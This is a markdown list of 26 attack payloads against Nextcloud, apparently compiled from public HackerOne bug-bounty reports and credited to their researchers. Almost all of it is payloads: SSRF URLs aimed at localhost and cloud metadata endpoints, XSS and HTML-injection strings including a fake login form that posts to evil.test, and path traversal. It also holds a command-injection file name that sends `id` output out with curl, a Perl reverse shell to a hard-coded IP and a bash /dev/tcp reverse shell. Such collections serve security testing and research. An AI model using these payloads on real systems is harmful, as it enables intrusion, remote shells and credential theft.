# Nextcloud

26 payloads.

### `0547c2a3`

```
http://127.0.0.1:8080**
```

**Parameter:** `url`
— [Server side request forgery (SSRF) on nextcloud implementation.](https://hackerone.com/reports/145524) · Nextcloud · [paglababa](https://hackerone.com/paglababa)

### `e1df77f1`

```
nextcloud/index.php/apps/gallery/#%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3Ejavascript:alert%280%29//%00
```

— [Reflected XSS in Gallery App](https://hackerone.com/reports/165686) · Nextcloud · [soreks](https://hackerone.com/soreks)

### `2230ba6e`

```
'../../abc/xyz'
```

— [URI scheme bypass in mail app lead to HTML content spoof and opener control](https://hackerone.com/reports/175085) · Nextcloud · [trichimtrich_](https://hackerone.com/trichimtrich_)

### `9f2f4bed`

```
"x><img src=a onerror=alert(1)>
```

**Parameter:** `name`
— [Stored XSS on new Calling plugin (spreed)](https://hackerone.com/reports/190870) · Nextcloud · [coolboss](https://hackerone.com/coolboss)

### `8294efc8`

```
https://127.0.0.1:22
```

— [SSRF at target.com/developer/apps/releases/new](https://hackerone.com/reports/213358) · Nextcloud · [t-pwn](https://hackerone.com/t-pwn)

### `f79194d9`

```
https://127.0.0.1:80
```

— [SSRF at target.com/developer/apps/releases/new](https://hackerone.com/reports/213358) · Nextcloud · [t-pwn](https://hackerone.com/t-pwn)

### `e682ebb9`

```
https://127.0.0.1:21
```

— [SSRF at target.com/developer/apps/releases/new](https://hackerone.com/reports/213358) · Nextcloud · [t-pwn](https://hackerone.com/t-pwn)

### `128bfb44`

```
target.com/heh<script>alert(1)
```

— [Stored XSS on target.com](https://hackerone.com/reports/390728) · Nextcloud · [5b66c571](https://hackerone.com/5b66c571)

### `36f97050`

```
nameOfFile=sample.rar"|curl target.com:443/data?id=$(id | base64)|"&directory=&external=0
```

**Parameter:** `nameOfFile`
— [Remote Code Execution via Extract App Plugin](https://hackerone.com/reports/546753) · Nextcloud · [hdbreaker](https://hackerone.com/hdbreaker)

### `0b72e91f`

```
use Socket;$i="138.68.1.244";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}
```

— [Remote Code Execution via Extract App Plugin](https://hackerone.com/reports/546753) · Nextcloud · [hdbreaker](https://hackerone.com/hdbreaker)

### `f12655de`

```
http://192.168.144.128/nextcloud/remote.php/dav/files/user/../.bash_profile
```

— [Linux client is vulnerable to directory traversal when downloading files](https://hackerone.com/reports/590319) · Nextcloud · [netranger](https://hackerone.com/netranger) · $250.0

### `6dcc52d4`

```
<svg width="256" height="128" version="1.1" viewBox="0 0 256 128" xmlns="http://target.com/2000/svg"><g fill="none" stroke-width="22"><circle cx="40" cy="64" r="26" stroke="#fff"/><foreignObject class="node" x="0" y="0" width="600" height="600"><div xmlns="http://target.com/1999/xhtml"><p>Login</p><form action="//evil.test"><input placeholder="Username" type="text"/><br/> <input placeholder="Password" type="text" /><br/><input type="submit" value="Login" /></form></div></foreignObject><circle al
```

— [Reflected XSS / Markup Injection in `index.php/svg/core/logo/logo` parameter `color`](https://hackerone.com/reports/605915) · Nextcloud · [freddyb](https://hackerone.com/freddyb)

### `1f83dff5`

```
https://target.com/nextcloud/index.php/svg/core/logo/logo?color=f00%22/%3E%3Cg%20onload=%22javascript:alert(1
```

**Parameter:** `color`
— [Reflected XSS / Markup Injection in `index.php/svg/core/logo/logo` parameter `color`](https://hackerone.com/reports/605915) · Nextcloud · [freddyb](https://hackerone.com/freddyb)

### `6a6863e0`

```
test'"><img src=x onerror=alert(document.location)>.txt
```

— [Persistent XSS via filename in projects](https://hackerone.com/reports/662204) · Nextcloud · [foobar7](https://hackerone.com/foobar7) · $150.0

### `56757a5b`

```
http://[0:0:0:0:0:ffff:127.0.0.1
```

— [SSRF protection bypass](https://hackerone.com/reports/736867) · Nextcloud · [foobar7](https://hackerone.com/foobar7) · $100.0

### `be540e19`

```
bash -i >& /dev/tcp/<c2-ip-here>/8888 0>&1 &
```

— [Code injection possible with malformed Nextcloud Talk chat commands](https://hackerone.com/reports/851807) · Nextcloud · [covert-spectre](https://hackerone.com/covert-spectre)

### `a3350db8`

```
/wiki test $(id)
    /wiki test $(pwd)
    /wiki test $(ls -al .)
    /calc test $(cat /etc/passwd)
    /calc test $(ls -al ../)
```

— [Code injection possible with malformed Nextcloud Talk chat commands](https://hackerone.com/reports/851807) · Nextcloud · [covert-spectre](https://hackerone.com/covert-spectre)

### `a55dc56a`

```
/wiki test $(mycommand)
```

— [Code injection possible with malformed Nextcloud Talk chat commands](https://hackerone.com/reports/851807) · Nextcloud · [covert-spectre](https://hackerone.com/covert-spectre)

### `0250245a`

```
/calc test $(ls ../)
```

— [Code injection possible with malformed Nextcloud Talk chat commands](https://hackerone.com/reports/851807) · Nextcloud · [covert-spectre](https://hackerone.com/covert-spectre)

### `238e60bd`

```
<br/> <br/><br/><br/><br/><br/><marquee><p style="color:red;"><b>!!!!! IMPORTANT message from Nextcloud administrator !!!!!!</b></p></marquee><br/><br/> A security issue was found last night.<br/> <p style="color:green;">Please go to manually on <a><b>target.com</a></b> to reset your password.</p> <b><p style="color:red;">Thank you in advance for doing so as soon as possible. </p></b><br/><br/><i>The IT team.</i></b><br/><br/> <br/><br/><br/> <b><marquee><p style="color:red
```

— [HTML Injection on "polls" app - comments section (possibly XSS)](https://hackerone.com/reports/1108420) · Nextcloud · [supr4s](https://hackerone.com/supr4s)

### `ef04569f`

```
http://metadata.google.internal
```

— [SSRF via potential filter bypass with too lax local domain checking](https://hackerone.com/reports/1608039) · Nextcloud · [tomorrowisnew_](https://hackerone.com/tomorrowisnew_) · $250.0

### `8b92f198`

```
169.254.169.254
```

— [SSRF via filter bypass due to lax checking on IPs](https://hackerone.com/reports/1702864) · Nextcloud · [obitorasu](https://hackerone.com/obitorasu) · $250.0

### `0caaca9b`

```
<img src="https://target.com/u/99037623">
```

— [XSS in Desktop Client via user status and information](https://hackerone.com/reports/1707977) · Nextcloud · [b911bade858ce8e6a0f50f8](https://hackerone.com/b911bade858ce8e6a0f50f8)

### `f2887e98`

```
{"imapHost":"127.0.0.1","imapPort":<port_number>,"imapSslMode":"none","imapUser":"xxx@xxx.org","imapPassword":"xxx","smtpSslMode":"none","smtpUser":"xxx@xxx.org","smtpPassword":"xxx","accountName":"xxx@xxx.org","emailAddress":"xxx@xxx.org"}
```

— [Mail app - blind SSRF via imapHost parameter](https://hackerone.com/reports/1736390) · Nextcloud · [supr4s](https://hackerone.com/supr4s)

### `70a00a7c`

```
{"imapHost":"target.com","imapPort":993,"imapSslMode":"ssl","imapUser":"redacted","imapPassword":"redacter","smtpHost":"127.0.0.1","smtpPort":8080,"smtpSslMode":"none","smtpUser":"xx","smtpPassword":"xx","accountName":"Test1","emailAddress":"xxx@xxx.org"}
```

— [Mail app - blind SSRF via smtpHost parameter](https://hackerone.com/reports/1746582) · Nextcloud · [supr4s](https://hackerone.com/supr4s)

### `859a2306`

```
system('id')
```

— [RCE on Wordpress website](https://hackerone.com/reports/2248328) · Nextcloud · [lukasreschke](https://hackerone.com/lukasreschke)
